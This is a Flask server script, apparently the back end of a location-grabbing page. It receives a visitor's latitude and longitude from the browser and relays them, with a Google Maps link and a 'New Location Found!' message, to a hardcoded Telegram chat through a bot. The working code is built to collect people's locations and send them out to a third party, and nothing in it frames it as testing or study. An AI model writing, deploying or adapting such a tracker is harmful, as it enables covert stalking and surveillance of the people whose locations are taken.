from flask import Flask, render_template, request, jsonify
import os
import requests

app = Flask(__name__)

# --- APNI DETAILS YAHAN DAAL DI HAIN ---
BOT_TOKEN = "APNA_API_TOKEN_YAHAN_DAALEIN" # Jo BotFather ne diya tha
CHAT_ID = "8450988216"

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error sending message: {e}")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/save-data', methods=['POST'])
def save_data():
    data = request.json
    lat = data.get('lat')
    lon = data.get('lon')
    
    # Ye link seedha Google Maps par location dikhayega
    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    
    log_message = f"📍 *New Location Found!*\n\n🌐 Latitude: `{lat}`\n🌐 Longitude: `{lon}`\n\n🔗 View on Maps: {maps_link}"
    
    # Telegram par bhejega
    send_telegram_message(log_message)
    
    # Logs mein print karega
    print(f"Data sent to Telegram: {lat}, {lon}")
    
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
